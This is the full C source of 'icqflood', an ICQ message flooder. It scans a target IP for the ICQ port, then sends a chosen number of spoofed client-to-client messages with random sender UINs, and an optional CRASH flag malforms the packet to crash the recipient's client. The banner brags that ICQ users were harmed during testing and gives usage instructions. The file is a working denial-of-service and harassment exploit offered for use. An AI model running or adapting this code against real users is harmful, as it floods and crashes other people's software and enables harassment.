/*
-------------------------------------------------
  ---------------------------------------------
  - icqflood.c, ICQ Message Flooder for Linux -
  -         Created by enkil^ and irQ         -
  ---------------------------------------------

----------------------GREETZ---------------------
-                                               -
- #c0de cause they bitchez, #ICQ for being our  -  Well, here it is:
-   unwilling "crash" test dummies, dj0rpheus   -  A program capible
-     because he wilingly "felt the fury",      -  of exploiting the
-              and to Realistic:                -  terrible blind trust
-          "that's nice ya cumbubble"           -  protocol that the ICQ
-                                               -  client/server use
--------------------[WARNING]-------------------- 
-                                               -  This is being released
-  ICQ users WERE harmed during the testing of  -  to CLUE MIRIBILIS IN!
-                  this product                 -  
-                                               -  Fix it, fuck this is
----------------------USAGE----------------------  almost sickening...
-                                               -   
-          icqfld <ip> <num> <sp> <p>           - 
-                                               -
--------------------ARGUMENTS--------------------  Use this program
-                                               -  code at your own
- <ip>  - IP Address of user to flood           -  risk. 
- <num> - Number of Messages to flood user with -
- <sp>  - port to start scanning at             -  If your going to 
- <ep>  - port at which to end scanning         -  re-do our code,
-                                               -  or use it in your
-------------------------------------------------  creations, credit us.
 
						   enkil&irq.


icqflood: icqflood.c
	gcc -o icqfld icqflood.c
*/
/*
 * ICQ Message Flooder by enkil^ and irQ
 * Arguments:
 * 	<ip> - IP Address of user to flood
 *	<number of messages> - Number of Messages to flood user with
 *	<start port> - port to start scanning at
 *	<end port> - port at which to end scanning
 * PLEASE READ THE `README' FILE FOR DISCLAIMER AND GREETZ!
 */
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>

/*
 * Un Comment this if you would like to crash the other users ICQ instead
 * Will not work on icq98, must re-compile to use.
 */
//#define  CRASH 16

/*
 * Program (icqflood) Version
 */
#define VER	"v1.0"

/*
 * Converts 3 characters into a UIN (reverse byte order decimal)
 */ 
#define UIN(c,b,a) ((a << 16) | (b << 8) | c)

/*
 * the data to be sent to the user
 * This is the data that represents a message (client to client... 
 * not through the server)
 */
unsigned char i_header[] = {
	0x8C,0xDD,0x33,0x00,0x02,0x00,0xEE,0x07,
	0x00,0x00,0x8C,0xDD,0x33,0x00,0x01,0x00,
	0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x82,0xD7,0xF3,0x20,0x82,0xD7,0xF3,0x20,
	0x09,0x04,0x00,0x00,0x04,0x00,0x00,0x00,
	0xED,0xFF,0xFF,0xFF
};

/*
 * Function: ScanPort
 * Scans ports within a range (StartIP to EndIP)
 */
int ScanPort(char *ipaddr, int StartIP, int EndIP) {
	struct sockaddr_in sin;
	int sock,x,y;
	unsigned long uin;
	printf("Scanning Ports");
	for (x=StartIP;x<=EndIP;++x) {
        	if (!(sock = socket(AF_INET, SOCK_STREAM, 0))) {
               		printf("Error: Unable to connect\n");
			return -1;
		}
		sin.sin_family = AF_INET;
        	sin.sin_addr.s_addr = inet_addr(ipaddr);
	       	sin.sin_port = htons(x);
	        	
		if (connect(sock, (struct sockaddr*)&sin,sizeof(sin))!=-1) {
			close(sock);
			printf("Port %d Open! Flooding...\n",x);
			fflush(stdout);
			return x;
		} 
		printf(".");
		fflush(stdout);
	}
	printf("\n");
	return -1;
}

/*
 * Function: Usage
 * Displays the USAGE for icqfld
 */
void Usage(char *EXEName) {
	printf("* ICQ Message Flooder %s by enkil^ and irQ\n",VER);
	printf("* Usage: %s <ip> <number of messages> <start port> <end port>\n",EXEName);
	printf("* Arguments:\n");
	printf("* 	<ip> - IP Address of user to flood\n");
	printf("*	<number of messages> - Number of Messages to flood user with\n");
	printf("*	<start port> - port to start scanning at\n");
	printf("*	<end port> - port at which to end scanning\n");
}

/*
 * Function: main
 * Main loop, open socket... send the message... close socket (repeat for firm
 * abs and thighs)
 */
int main(int argc, char *argv[]) {
	struct sockaddr_in sin;
	int sock,x,y;
	unsigned long uin;
	int Port;

        if (argc < 5) {
		Usage(argv[0]);
		exit(1);
 	}
	printf("ICQ Message Flooder %s by enkil^ and irQ\n",VER);
	fflush(stdout);
	srand(time());

	Port = ScanPort(argv[1],atoi(argv[3]),atoi(argv[4]));

	if (Port == -1) {
		printf("No ICQ Port Found =(\n");
		return;
	}

	printf("Flooding %s on port %d, %d times -\n",argv[1], Port, atoi(argv[2]));
	fflush(stdout);
	for (y=0;y<atoi(argv[2]);++y) {
	        if (!(sock = socket(AF_INET, SOCK_STREAM, 0))) {
        	        printf("Error: Unable to creat socket, Exiting.\n");
			exit(1);
		}
		sin.sin_family = AF_INET;
        	sin.sin_addr.s_addr = inet_addr(argv[1]);
       		sin.sin_port = htons(Port);

		for (x=0;x<3;++x) i_header[x] = i_header[x+10] = (rand() % 256);
		for (x=0;x<6;++x) i_header[18+x] = (rand() % 256);
/* 
 * changes the header so that ICQ can't handle it
 */
#ifdef CRASH
		i_header[CRASH]=0x07;
#endif	        	
		if (connect(sock, (struct sockaddr*)&sin,sizeof(sin))==-1) {
			printf("Error Connecting to Socket\n");
			return;
		} 

	        write(sock, "\x2E\x00", 2);
       		write(sock, &i_header,sizeof(i_header));
        	write(sock, "\x28\x00", 2);

		uin = UIN(i_header[0],i_header[1],i_header[2]);

		printf("Message Sent, UIN = %d\n",uin);

		fflush(stdout);
		close(sock);
	}
	printf("Done!\n");
	return 0;
	//exit(0);

}
